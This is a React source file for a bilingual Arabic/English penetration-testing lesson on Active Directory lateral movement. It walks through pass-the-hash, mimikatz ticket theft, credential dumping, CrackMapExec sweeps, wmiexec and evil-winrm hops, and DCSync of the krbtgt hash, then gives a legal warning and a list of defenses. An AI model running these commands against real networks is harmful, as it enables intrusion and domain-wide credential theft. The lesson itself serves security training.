"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="lateral-movement">
      <L
        ar={<>
          <Section title="من جهاز واحد للشبكة كلها">
            <Analogy>
              تخيّل حرامي دخل أوضة في فندق. الباب اللي وراه بيفتح على ممر فيه ميت أوضة. الحركة الجانبية =
              استخدام الـ credentials أو الأدوات اللي في الأوضة الواحدة دي علشان تفتح اللي جنبها، وكل أوضة جديدة
              بتعمّقلك الوصول أكتر.
            </Analogy>
            <p>
              Lateral Movement = مرحلة ATT&CK TA0008. محدش بيوصل لـ Domain Admin بسطر واحد. أنت بتنط من جهاز للتاني
              وتلم credentials في كل وقفة، لحد ما تنزل على جهاز عليه session لـ Domain Admin أو DC. الصبر هنا
              مهم زي المهارة.
            </p>
          </Section>

          <Section title="أدوات الحركة الأساسية">
            <TwoCol>
              <Card title="بروتوكولات Windows أصلية" color="blue">
                <ul>
                  <li><span className="eng">SMB (445)</span> — PsExec, smbexec</li>
                  <li><span className="eng">WMI (135 + ephemeral)</span> — wmiexec</li>
                  <li><span className="eng">WinRM (5985/5986)</span> — Invoke-Command</li>
                  <li><span className="eng">RDP (3389)</span> — أبسط لكن الأكثر مراقبة</li>
                  <li><span className="eng">DCOM</span> — أقل صخباً، MMC20.Application</li>
                </ul>
              </Card>
              <Card title="Pivoting / Tunneling" color="amber">
                <ul>
                  <li><span className="eng">Chisel</span> — TCP/UDP عبر HTTP</li>
                  <li><span className="eng">Ligolo-ng</span> — أحدث، أداء عالٍ</li>
                  <li><span className="eng">SOCKS5</span> via SSH أو proxychains</li>
                  <li>Sliver / Cobalt Strike — pivot listeners</li>
                </ul>
              </Card>
            </TwoCol>
          </Section>

          <Section title="Pass-the-Hash و Pass-the-Ticket">
            <Step n={1} title="ما هي PtH؟">
              NTLM يستخدم hash كمفتاح authentication، ليس كلمة المرور. لو سرقت hash من LSASS، لا تحتاج لكسره —
              ابعثه مباشرة كأنك تعرف كلمة السر.
              <Code lang="bash">{`# باستخدام impacket
psexec.py -hashes :ntlm-hash-here corp.local/Administrator@10.0.0.50`}</Code>
            </Step>
            <Step n={2} title="Pass-the-Ticket">
              Kerberos أصعب لكن أقل ضوضاء. سرقة TGT أو TGS من ذاكرة عملية، ثم حقنها في session مختلف.
              <Code lang="bash">{`# تصدير TGTs
mimikatz # sekurlsa::tickets /export

# على آلة مختلفة
mimikatz # kerberos::ptt c:\\temp\\target.kirbi
psexec.exe \\\\dc01 cmd`}</Code>
            </Step>
          </Section>

          <Section title="Walkthrough: من workstation إلى DC">
            <Step n={1} title="جمع الاعتمادات على الجهاز الحالي">
              <Code lang="bash">{`# بعد SYSTEM (انظر windows-privesc)
mimikatz # sekurlsa::logonpasswords
# أو
secretsdump.py -system SYSTEM -sam SAM LOCAL`}</Code>
            </Step>
            <Step n={2} title="استكشاف الشبكة">
              <Code lang="bash">{`# CrackMapExec — الأداة الذهبية للحركة الجانبية
crackmapexec smb 10.0.0.0/24 -u admin -H ntlm-hash --shares
crackmapexec smb 10.0.0.0/24 -u admin -H ntlm-hash --lsa  # dump SAM/LSA

# اكتشف الأجهزة التي قبلت الاعتماد
crackmapexec smb 10.0.0.0/24 -u admin -H ntlm-hash | grep "(Pwn3d!)"`}</Code>
            </Step>
            <Step n={3} title="انتقل إلى الجهاز التالي">
              <Code lang="bash">{`# WMI execution — يتجاوز PsExec في معظم EDRs
wmiexec.py corp/admin@10.0.0.55 -hashes :hash

# أو WinRM
evil-winrm -i 10.0.0.55 -u admin -H hash`}</Code>
            </Step>
            <Step n={4} title="ابحث عن session لـ Domain Admin">
              <Code lang="bash">{`# BloodHound يكشف من سجل دخوله أين
# Cypher: MATCH p=(u:User {admincount:true})-[:HasSession]->(c:Computer) RETURN p
# لو جهازك pwn3d وجد عليه DA session = اقترب`}</Code>
            </Step>
            <Step n={5} title="DCSync — السحب النهائي">
              <Code lang="bash">{`# لو وصلت لـ DA أو user عنده DCSync rights
secretsdump.py -just-dc-user 'corp\\krbtgt' corp/da@dc01
# الحصول على krbtgt hash = Golden Ticket = ملك للنطاق`}</Code>
            </Step>
          </Section>

          <Callout kind="danger" title="تحذير قانوني">
            استخدم ده في معمل AD معزول. الحركة الجانبية في شبكة فيدرالية من غير authorization صريح = جناية.
            بناء lab AD محلي ببلاش وموجود (GOAD على GitHub) — مفيش عذر.
          </Callout>

          <Callout kind="good" title="الدفاع — كسر سلسلة الحركة الجانبية">
            <ul>
              <li>تطبيق Tier model: Tier 0 (DCs) لا يقبل اعتمادات Tier 1/2</li>
              <li>تعطيل NTLM حيث أمكن، فرض Kerberos فقط</li>
              <li>LAPS لكلمات مرور المسؤول المحلي — كل جهاز كلمة فريدة</li>
              <li>حظر SMB من workstation إلى workstation (lateral SMB)</li>
              <li>Network Segmentation — VLANs و firewalls داخلية</li>
              <li>Honey accounts: مسؤول وهمي، أي محاولة استخدام = alert</li>
              <li>راقب 4624 logon type 3 من workstations نحو servers خارج الـ pattern</li>
            </ul>
          </Callout>

          <Section title="مصادر">
            <ul>
              <li>SpecterOps — An ACE Up The Sleeve</li>
              <li>BloodHound documentation — attack paths</li>
              <li>MITRE ATT&CK — TA0008 Lateral Movement</li>
              <li>GOAD lab — <span className="eng">github.com/Orange-Cyberdefense/GOAD</span></li>
            </ul>
          </Section>
        </>}

        en={<>
          <Section title="From one box to the whole network">
            <Analogy>
              A burglar in a hotel room. The door behind them opens to a corridor of a hundred rooms. Lateral movement
              is using the credentials and tools available in that one room to open neighboring rooms, then using each
              new room to deepen access.
            </Analogy>
            <p>
              Lateral movement is ATT&CK TA0008. Nobody pivots to Domain Admin in one shot. You move host to host,
              picking up credentials at each stop, until you land on a box that has a Domain Admin session or a DC.
            </p>
          </Section>

          <Section title="Core movement tools">
            <TwoCol>
              <Card title="Native Windows protocols" titleEn="Native Windows protocols" color="blue">
                <ul>
                  <li><span className="eng">SMB (445)</span> — PsExec, smbexec</li>
                  <li><span className="eng">WMI (135 + ephemeral)</span> — wmiexec</li>
                  <li><span className="eng">WinRM (5985/5986)</span> — Invoke-Command</li>
                  <li><span className="eng">RDP (3389)</span> — easiest, most monitored</li>
                  <li><span className="eng">DCOM</span> — quieter, MMC20.Application</li>
                </ul>
              </Card>
              <Card title="Pivoting / tunneling" titleEn="Pivoting / tunneling" color="amber">
                <ul>
                  <li><span className="eng">Chisel</span> — TCP/UDP over HTTP</li>
                  <li><span className="eng">Ligolo-ng</span> — newer, high performance</li>
                  <li><span className="eng">SOCKS5</span> via SSH or proxychains</li>
                  <li>Sliver / Cobalt Strike — pivot listeners</li>
                </ul>
              </Card>
            </TwoCol>
          </Section>

          <Section title="Pass-the-Hash and Pass-the-Ticket">
            <Step n={1} title="What is PtH?">
              NTLM uses the hash itself as the auth key, not the password. Steal the hash from LSASS and you don't
              need to crack it — replay it as if you knew the password.
              <Code lang="bash">{`# impacket
psexec.py -hashes :ntlm-hash-here corp.local/Administrator@10.0.0.50`}</Code>
            </Step>
            <Step n={2} title="Pass-the-Ticket">
              Kerberos is harder but quieter. Steal a TGT or TGS from process memory and inject it into a different
              session.
              <Code lang="bash">{`# export TGTs
mimikatz # sekurlsa::tickets /export

# on a different host
mimikatz # kerberos::ptt c:\\temp\\target.kirbi
psexec.exe \\\\dc01 cmd`}</Code>
            </Step>
          </Section>

          <Section title="Walkthrough: workstation → DC">
            <Step n={1} title="Harvest creds on the current host">
              <Code lang="bash">{`# After SYSTEM (see windows-privesc)
mimikatz # sekurlsa::logonpasswords
# or
secretsdump.py -system SYSTEM -sam SAM LOCAL`}</Code>
            </Step>
            <Step n={2} title="Map the network">
              <Code lang="bash">{`# CrackMapExec — the gold standard for lateral movement
crackmapexec smb 10.0.0.0/24 -u admin -H ntlm-hash --shares
crackmapexec smb 10.0.0.0/24 -u admin -H ntlm-hash --lsa  # dump SAM/LSA

# Find boxes that accepted the credential
crackmapexec smb 10.0.0.0/24 -u admin -H ntlm-hash | grep "(Pwn3d!)"`}</Code>
            </Step>
            <Step n={3} title="Hop to the next host">
              <Code lang="bash">{`# WMI execution — bypasses PsExec on most EDRs
wmiexec.py corp/admin@10.0.0.55 -hashes :hash

# or WinRM
evil-winrm -i 10.0.0.55 -u admin -H hash`}</Code>
            </Step>
            <Step n={4} title="Hunt for a Domain Admin session">
              <Code lang="bash">{`# BloodHound shows where DAs have logged on
# Cypher: MATCH p=(u:User {admincount:true})-[:HasSession]->(c:Computer) RETURN p
# Pwn3d host with a DA session = endgame`}</Code>
            </Step>
            <Step n={5} title="DCSync — the final pull">
              <Code lang="bash">{`# As DA or any user with DCSync rights
secretsdump.py -just-dc-user 'corp\\krbtgt' corp/da@dc01
# krbtgt hash = Golden Ticket = ownership of the domain`}</Code>
            </Step>
          </Section>

          <Callout kind="danger" titleEn="Legal warning">
            Use this in an isolated AD lab. Lateral movement in a federal network without explicit written
            authorization is a felony. A free local AD lab (GOAD on GitHub) is one command away.
          </Callout>

          <Callout kind="good" titleEn="Defense — break the lateral chain">
            <ul>
              <li>Tier model: Tier 0 (DCs) does not accept Tier 1/2 credentials</li>
              <li>Disable NTLM where possible, force Kerberos only</li>
              <li>LAPS for local admin passwords — every host unique</li>
              <li>Block workstation-to-workstation SMB</li>
              <li>Network segmentation — VLANs and internal firewalls</li>
              <li>Honey accounts: dummy admin, any login attempt = alert</li>
              <li>Watch 4624 logon type 3 from workstations to servers outside baseline</li>
            </ul>
          </Callout>

          <Section title="References">
            <ul>
              <li>SpecterOps — An ACE Up The Sleeve</li>
              <li>BloodHound documentation — attack paths</li>
              <li>MITRE ATT&CK — TA0008 Lateral Movement</li>
              <li>GOAD lab — <span className="eng">github.com/Orange-Cyberdefense/GOAD</span></li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
